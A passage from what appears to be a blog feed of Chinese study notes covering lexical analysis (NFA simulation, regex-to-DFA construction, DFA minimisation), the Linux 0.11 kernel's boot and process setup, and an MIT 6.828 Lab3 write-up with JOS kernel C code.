title="NFA的双堆栈模拟"></a>NFA的双堆栈模拟</h3><p>至此我们已经完成了对正规表达式r的识别器的构造.而实际上,NFA也是可以直接模拟的.</p><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><p>回想一下我们是怎么实现NFA到DFA转换的那两个目标,可以发现该模拟算法实质上是在运行中构造DFA.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121839249.png"></p><h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h4><p>我们要实现的结构有两个,当前状态集合,要转换到的状态集合.注意这里与DFA模拟时不同,DFA中状态集合是实现为一个新的状态,有状态集合之间独立的转换关系(新的转换表),而模拟NFA时我们只具有单个状态之间的转换关系.</p><p>这两个结构可以以两个栈的形式实现.一个栈表示当前状态集合,一个栈表示要转换到的状态集合.压入所有在ε-closure(当前状态)的输出状态.转换时遍历当前状态集合的每一个状态并进行状态转换,压入结果到另一个栈中.清空当前状态集合,两个栈交换身份.</p><h3 id="最长词素匹配"><a href="#最长词素匹配" class="headerlink" title="最长词素匹配"></a>最长词素匹配</h3><p>常见有如下的实现:如果有多个模式匹配成功,选择最长词素匹配的模式.<br>当当前状态集合中含有接受状态时,记录当前输入指针的位置和该接受状态后继续识别,直到NFA进入终止(无法状态转换或输入结束),恢复到最近一次保存的输入指针位置,以该接受状态为结果.</p><h3 id="基于DFA的模式匹配器的优化"><a href="#基于DFA的模式匹配器的优化" class="headerlink" title="基于DFA的模式匹配器的优化"></a>基于DFA的模式匹配器的优化</h3><h4 id="NFA的重要状态"><a href="#NFA的重要状态" class="headerlink" title="NFA的重要状态"></a>NFA的重要状态</h4><p>如果一个NFA的状态有一个标记为非ε的出边,那么该状态为重要状态.<br>如果两个子集的重要状态相同且两者同时包含或不包含NFA的接受状态,那么这两个子集可被认为是等同的.</p><blockquote><p>The constructed NFA has only one accepting state, but this state, having<br>no out-transitions, is not an imp ortant state. By concatenating a unique right<br>endmarker # to a regular expression r , we give the accepting state for r a<br>transition on #, making it an imp ortant state of the NFA for (r )#. In other<br>words, by using the augmented regular expression (r )#, we can forget ab out<br>accepting states as the subset construction pro ceeds; when the construction is<br>complete, any state with a transition on # must b e an accepting state.</p></blockquote><h4 id="Functions-Computed-From-the-Syntax-Tree"><a href="#Functions-Computed-From-the-Syntax-Tree" class="headerlink" title="Functions Computed From the Syntax Tree"></a>Functions Computed From the Syntax Tree</h4><h5 id="Compute"><a href="#Compute" class="headerlink" title="Compute"></a>Compute</h5><p>为了直接从正规表达式r构造DFA,需要从语法树中计算这四个函数.Each de nition refers to the syntax tree for a particular<br>augmented regular expression (r )#</p><p>直白点说,nullable就是该位置代表的字符串是否可以为空(ε).<br>firstpos就是该节点所代表的字符串可能的开始位置集合.<br>lastpos就是该节点所代表的字符串可能的结束位置集合.<br>followpos就是可能的紧跟着该位置的位置集合.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309087.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309685.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122312703.png"></p><p>最后我们需要的其实只有follow集,根据求出的follow集可以得到这样一个没有ε的NFA<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131045245.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131044965.png"></p><h5 id="TO-DFA"><a href="#TO-DFA" class="headerlink" title="TO DFA"></a>TO DFA</h5><p>其实感觉和之前的思想是差不多的,状态-&gt;状态集合.<br>使用根节点的first集合并初始状态,以是否有#转换来合并接受状态.其他状态由followpos来合并.<br>差别就在于之前是通过NFA的转换关系来合并的,这里是直接通过计算follow集来合并的(其实感觉是一回事).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046225.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046738.png"></p><h4 id="最小化DFA的状态数"><a href="#最小化DFA的状态数" class="headerlink" title="最小化DFA的状态数"></a>最小化DFA的状态数</h4><p>每一个正规集都可以由一个状态最少的DFA识别,这个DFA是唯一的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120540.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120171.png"></p><h4 id="表压缩算法"><a href="#表压缩算法" class="headerlink" title="表压缩算法"></a>表压缩算法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134804.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134760.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lexical-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核设计的艺术 阅读笔记</title>
      <link href="/2023/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/"/>
      <url>/2023/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/</url>
      
        <content type="html"><![CDATA[<p>Linux0.11内核.正文部分记录过程,引用部分记录知识点和理解.</p><h1 id="main函数之前的功能"><a href="#main函数之前的功能" class="headerlink" title="main函数之前的功能"></a>main函数之前的功能</h1><h2 id="加载操作系统"><a href="#加载操作系统" class="headerlink" title="加载操作系统"></a>加载操作系统</h2><p>经典流程:<br>计算机加电设置cs:ip为0xffff0,运行ROM中的BIOS,BIOS初始化中断向量表和一些硬件设备,加载0盘0道1扇区的引导程序bootsect到0x7c00处.bootsect是与操作系统配套的,规划物理内存,加载操作系统,设置根设备为软盘.</p><blockquote><p>Linux0.11要求系统必须存在一个根文件系统,其他文件系统挂接其上.因此Linux的启动需要两部分数据,即系统内核镜像和根文件系统.(kernel pwn中的bzimage和文件系统(比如busybox提供的))</p></blockquote><span id="more"></span><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>关闭中断.设置全局描述符表(GDT),打开A20gate实现32位寻址(实模式下寻址范围为低1MB).CR0PE标志置1,enable 保护模式,GDT启用,段基址寄存器以选择子形式使用.</p><p>设置段寄存器以适应保护模式,建立内核页目录表,建立中断描述符表(IDT),开启分页模式.以ret模式进入main函数.</p><h1 id="环境设备初始化及激活进程0"><a href="#环境设备初始化及激活进程0" class="headerlink" title="环境设备初始化及激活进程0"></a>环境设备初始化及激活进程0</h1><p>初始化根设备和硬盘.设置缓冲区.</p><blockquote><p>除内核代码及其数据所占物理空间之外,其余物理内存主要分为3部分,主内存区(进程代码运行的空间),缓冲区(主机与外设进行数据交互的中转站),虚拟盘(可以缓存外设的数据,提高效率).</p></blockquote><p>建立内存管理基址mmu,将中断异常与IDT挂接(其实这里才是建立中断描述符表吧).开启部分中断.</p><p>初始化块设备请求项结构</p><blockquote><p>Linux0.11将外设分为两类:<br>块设备:将存储空间等分为若干同样大小的小存储空间块,每个块有块号,可以独立,随机读写,如硬盘,软盘.<br>字符设备:以字符为单位进行IO通信,如键盘,命令行显示器.</p></blockquote><p>进程想与块设备沟通,必须经过主机内存中的缓冲区.请求项管理结构就是管理缓冲区中缓冲块与块设备上逻辑块之间读写关系的数据结构.是以一个数组,同时也维护一个请求链表.</p><p>挂接交互界面相关外设的中断服务例程.如串行口,显示器,键盘.</p><p>初始化进程0,设置task_struct,使进程0具有处理系统调用的能力,设置时钟中断做好进程切换的准备工作.</p><p>最后以iret(唯一的从高权限到低权限的方式)的方式切换到3特权级,之前运行的内核控制流正式成为进程0.</p><h1 id="进程1的创建及执行"><a href="#进程1的创建及执行" class="headerlink" title="进程1的创建及执行"></a>进程1的创建及执行</h1><p>进程0通过fork创建进程1,设置相关数据结构,切换到进程1.</p><blockquote><p>通常有以下两种情况可以产生进程切换:</p><ol><li>允许进程运行的时间结束.每个进程在创建时都被赋予了有限的时间片,当时间片减少到0便发生进程切换.</li><li>进程的运行停止.比如等待外设的数据,等待其他程序运行的结果,进程主动停止一段时间或进程执行完毕等等.</li></ol></blockquote><p>进程1安装硬盘文件系统.格式化虚拟盘(使其具有文件系统相关内容,引导块,超级块,格式化之后虚拟盘正式成为一个块设备)并更换根设备为虚拟盘.</p><blockquote><p>操作系统中的文件系统可以大致分为两部分,一部分在操作系统内核中,另一部分在硬盘,软盘,虚拟盘中.<br>文件系统用inode(i结点)来管理文件,一个inode管理一个文件.文件的路径在操作系统中由目录文件中的目录项管理,一个目录项对应一级路径,目录文件也是文件,也由一个inode管理.一个目录文件挂在另一个目录文件的目录项上,就成了父子目录的关系.所有的文件最终挂接成一个树形结构,树根i节点就叫这个文件系统的根i节点.一个逻辑设备(一个物理设备可分成多个逻辑设备)只能包含一个这样的树形结构.</p></blockquote><blockquote><p>加载文件系统最重要的标志,就是把一个逻辑设备上的文件系统的根i节点,关联到另一个文件系统的i节点,也就是常说的mount.可以联系一下之前容器中bind mount的操作.</p></blockquote><blockquote><p>一个文件系统必须挂接在另一个文件系统上,必然就存在一个根文件系统,Linux0.11中的super_block[8]中保存的根设备的超级块对应的文件系统便是根文件系统.</p></blockquote><h1 id="进程2的创建及执行"><a href="#进程2的创建及执行" class="headerlink" title="进程2的创建及执行"></a>进程2的创建及执行</h1><p>加载完根文件系统之后,进程1(其实是kernel)具备了对设备文件的访问能力.使用open和dup打开/dev/tty0文件作为标准输入,输出,错误文件.</p><p>进程1创建进程2并切换到进程2.进程2关闭标准输入重新以/etc/rc为标准输入,execve运行/bin/sh的shell程序.相当于shell的初始化,执行/etc/rc里的预置命令,比如创建进程并加载/etc/update程序</p><blockquote><p>update进程将缓冲区中的数据同步到外设.该程序每隔一段时间就会被唤醒,完成同步工作后挂起等待下一次唤醒.</p></blockquote><p>update进程挂起后控制流回到进程2,进程2完成善后工作后退出.</p><p>进程1继续执行,以/dev/tty0为标准输入重建shell.shell在等待输入后挂起,当接收到键盘中断,shell进程从字符缓冲队列(其实就是tty0的内容)读取指令数据,并完成相应操作.</p><p>至此系统进入怠速状态.</p><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><blockquote><p>安装文件系统就是在根文件系统的基础上,把硬盘中的文件系统安装在根文件系统上,使操作系统也具备<code>以文件形式与硬盘进行数据交互的能力</code>.</p></blockquote><blockquote><p>安装文件系统分三步:<br>1)将硬盘的超级块读取出来并载入super_block[8].<br>2)将虚拟盘上指定的i节点读出,加载到系统的inode_table[32]中.<br>(<del>是不是意味着最多只能挂载8个文件系统(设备),挂载点最多32个?</del>)<br>3) 将硬盘上的超级块挂接到指定的i节点上.</p></blockquote><h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><h2 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h2><blockquote><p>操作系统在内存中为每个管道开辟一页内存,为这一页内存赋予文件的属性,这一页内存由两个进程共享,但不会分配给任何进程,只由内核掌控.</p></blockquote><blockquote><p>从技术上看,管道就是一页内存.<br>1)文件属性:创建管道相当于创建(并打开)一个文件,进程对管道的访问形式与访问文件相同.<br>2)减少页属性:该页不映射到进程的地址空间内.无法被进程以内存形式访问.</p></blockquote><h2 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h2><blockquote><p>发送信号:<br>1)进程通过调用特定的库函数给另一个进程发送信号,另一种方式是用户通过键盘输入信息产生键盘中断后,中断服务例程给进程发送信号.发送信号的实质是设置信号位图上的信号位.(这也是为何未处理的相同信号会丢失的原因)</p></blockquote><blockquote><p>系统检测进程接收到的信号:<br>进程并不能检测收到的信号,该工作由内核完成.</p><ol><li>在系统调用返回之前检测当前进程是否接收到信号.</li><li>时钟中断产生后,其中断处理例程执行结束之前检测.</li></ol></blockquote><blockquote><p>处理信号.当用户程序不需要处理信号时,信号处理函数完全不参与用户进程的执行,当用户进程需要处理信号时,进程的程序将暂时停止执行,转而去执行信号处理函数,执行完毕后将从暂停的现场继续执行.</p></blockquote><p>这里处理信号的方式挺有意思的,解决了我看CSAPP时的一个疑问.</p><blockquote><p>在系统调用返回前或时钟中断返回前,先把内核栈中保存的寄存器备份在当前进程的<code>用户栈</code>中,修改内核栈中的寄存器使得iret之后跳转到用户空间的信号处理函数.处理完成后,再通过前面备份在用户空间的指令和数据,返回用户空间执行.</p></blockquote><p>这里又有一个问题,既然已经回到用户态了,那即使在用户栈上布置的暂停现场的状态,也无法通过ret指令完成状态(如edi等寄存器)的恢复.原来在信号处理函数完成后,从栈上弹出的返回地址是一个restorer函数的地址,它将完成用户进程状态的恢复并再次ret到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab3</title>
      <link href="/2023/6.828-Lab3/"/>
      <url>/2023/6.828-Lab3/</url>
      
        <content type="html"><![CDATA[<h1 id="Lec-7"><a href="#Lec-7" class="headerlink" title="Lec 7"></a>Lec 7</h1><p>一些虚拟内存实现的技巧,如延迟分配,写时复制等<br><a href="https://pdos.csail.mit.edu/6.828/2018/lec/l-usingvm.pdf">https://pdos.csail.mit.edu/6.828/2018/lec/l-usingvm.pdf</a></p><h2 id="Lab3-User-Environments"><a href="#Lab3-User-Environments" class="headerlink" title="Lab3 User Environments"></a>Lab3 User Environments</h2><h3 id="PartA-User-Environments-and-Exception-Handling"><a href="#PartA-User-Environments-and-Exception-Handling" class="headerlink" title="PartA: User Environments and Exception Handling"></a>PartA: User Environments and Exception Handling</h3><h4 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h4><p>创建并初始化envs,env_setup_vm函数为环境e建立一个专属的页目录表,由于在UTOP上的内核空间映射对每个环境都是相同的,所以可以直接拷贝kern_pgdir过来.</p><span id="more"></span><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">for</span>(e = envs;e&lt;envs+NENV;++e)</span><br><span class="line">{</span><br><span class="line">e-&gt;env_id = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_status = ENV_FREE;</span><br><span class="line">e-&gt;env_link = (e==envs+NENV<span class="number">-1</span>)?<span class="number">0</span>:e+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">env_free_list = envs;</span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">env_setup_vm</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">e-&gt;env_pgdir = page2kva(p);</span><br><span class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir,kern_pgdir,PGSIZE);</span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env's own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由于还没有文件系统,JOS采用将ELF文件直接链接到内核的方式来提供用户程序,load_icode函数按照binary文件中的ELF头和程序头,将binary映像加载到用户进程(以JOS的概念,进程应该改成环境)空间中,并建立用户页表的相应映射.</p><p>实现这一函数主要是熟悉ELF头和程序头各项的意义,其实在MBR加载内核映像的时候我们已经完成过相同的操作.注意页目录表的切换.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">load_icode</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">uint8_t</span> *binary)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> *<span class="title">elfhdr</span> =</span> (<span class="keyword">struct</span> Elf *)binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(elfhdr-&gt;e_magic!=ELF_MAGIC)</span><br><span class="line">panic(<span class="string">"invalid ELF format,magic is not correct\n"</span>);</span><br><span class="line"></span><br><span class="line">ph = (<span class="keyword">struct</span> Proghdr *)((<span class="type">uint8_t</span>*)elfhdr+elfhdr-&gt;e_phoff);</span><br><span class="line">eph = ph+elfhdr-&gt;e_phnum;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为使之后能直接使用memcpy,切换到用户页表.</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(;ph&lt;eph;++ph)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz)</span><br><span class="line">panic(<span class="string">"file size is great than memmory size\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_type==ELF_PROG_LOAD)</span><br><span class="line">{</span><br><span class="line">region_alloc(e-&gt;env_pgdir,ph-&gt;p_va,ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memcpy</span>(ph-&gt;p_va,binary+ph-&gt;p_offset,ph-&gt;p_filesz);</span><br><span class="line"><span class="built_in">memset</span>(ph-&gt;p_va+ph-&gt;p_filesz,<span class="number">0</span>,ph-&gt;p_memsz-ph-&gt;p_filesz);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;</span><br><span class="line"><span class="comment">// Now map one page for the program's initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line">region_alloc(e-&gt;env_pgdir,USTACKTOP-PGSIZE,PGSIZE);</span><br><span class="line"></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate len bytes of physical memory for environment env,</span></span><br><span class="line"><span class="comment">// and map it at virtual address va in the environment's address space.</span></span><br><span class="line"><span class="comment">// Does not zero or otherwise initialize the mapped pages in any way.</span></span><br><span class="line"><span class="comment">// Pages should be writable by user and kernel.</span></span><br><span class="line"><span class="comment">// Panic if any allocation attempt fails.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">region_alloc</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">void</span> *va, <span class="type">size_t</span> len)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   'va' and 'len' values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">pp</span>;</span></span><br><span class="line"><span class="type">void</span>* end_va = ROUNDUP(va+len,PGSIZE);</span><br><span class="line">va = ROUNDDOWN(va,PGSIZE);</span><br><span class="line"><span class="keyword">for</span>(;va&lt;end_va;va += PGSIZE)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((pp = page_alloc(ALLOC_ZERO))==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"region_alloc:out of memory"</span>);</span><br><span class="line">}</span><br><span class="line">page_insert(e-&gt;env_pgdir,pp,va,PTE_U|PTE_W|PTE_P);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后便可以创建用户环境并运行.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> ret = env_alloc(&amp;e,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"env_alloc:%e"</span>,ret);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">load_icode(e,binary);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>(curenv != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(curenv-&gt;env_status==ENV_RUNNING)</span><br><span class="line">curenv-&gt;env_status=ENV_RUNNABLE;</span><br><span class="line">}</span><br><span class="line">curenv = e;</span><br><span class="line">e-&gt;env_status=ENV_RUNNING;</span><br><span class="line">e-&gt;env_runs++;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line">env_pop_tf(&amp;e-&gt;env_tf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h5 id="env相关流程分析"><a href="#env相关流程分析" class="headerlink" title="env相关流程分析"></a>env相关流程分析</h5><h6 id="创建与初始化"><a href="#创建与初始化" class="headerlink" title="创建与初始化"></a>创建与初始化</h6><p>i386_init函数在mem_init函数中完成envs数组的内存分配并在kern_pgdir中完成映射.<br>调用env_init,初始化envs数组中的各env,并链入env_free_list等待分配,load新的带有用户段的GDT,设置LDT.</p><h6 id="运行准备与运行"><a href="#运行准备与运行" class="headerlink" title="运行准备与运行"></a>运行准备与运行</h6><p>env_create函数创建一个针对特定二进制(ELF)文件的运行环境.先调用env_alloc函数分配一个env结构,设置env环境(包括各段选择子,这是切换到用户级权限的关键之一),并为env建立一个单独的页表,映射内核及该页表本身.<br>调用load_icode函数按ELF头和文件头记录的信息为ELF格式的可执行文件创建内存映像,设置Trapframe-&gt;tf_eip为该程序的入口点,为环境映射一个初始栈.<br>env_run函数设置相关运行信息,调用env_pop_tf函数用env-&gt;env_tf设置程序状态,开始以用户级权限运行程序.</p><h4 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h4><p>trapentry.S中以宏的方式形式定义了各中断处理例程的入口,以及所有traps共用的例程alltraps.<br>该函数按照Trapframe的结构为trap函数压栈准备参数,设置ds和es寄存器.然后调用trap函数且不再返回.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/* TRAPHANDLER defines a globally-visible function for handling a trap.</span><br><span class="line"> * It pushes a trap number onto the stack, then jumps to _alltraps.</span><br><span class="line"> * Use TRAPHANDLER for traps where the CPU automatically pushes an error code.</span><br><span class="line"> *</span><br><span class="line"> * You shouldn't call a TRAPHANDLER function from C, but you may</span><br><span class="line"> * need to _declare_ one in C (for instance, to get a function pointer</span><br><span class="line"> * during IDT setup).  You can declare the function with</span><br><span class="line"> *   void NAME();</span><br><span class="line"> * where NAME is the argument passed to TRAPHANDLER.</span><br><span class="line"> */</span><br><span class="line">#define TRAPHANDLER(name, num)\</span><br><span class="line">.globl name;/* define global symbol for 'name' */\</span><br><span class="line">.type name, @function;/* symbol type is function */\</span><br><span class="line">.align 2;/* align function definition */\</span><br><span class="line">name:/* function starts here */\</span><br><span class="line">pushl $(num);\</span><br><span class="line">jmp _alltraps</span><br><span class="line"></span><br><span class="line">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn't push an error code.</span><br><span class="line"> * It pushes a 0 in place of the error code, so the trap frame has the same</span><br><span class="line"> * format in either 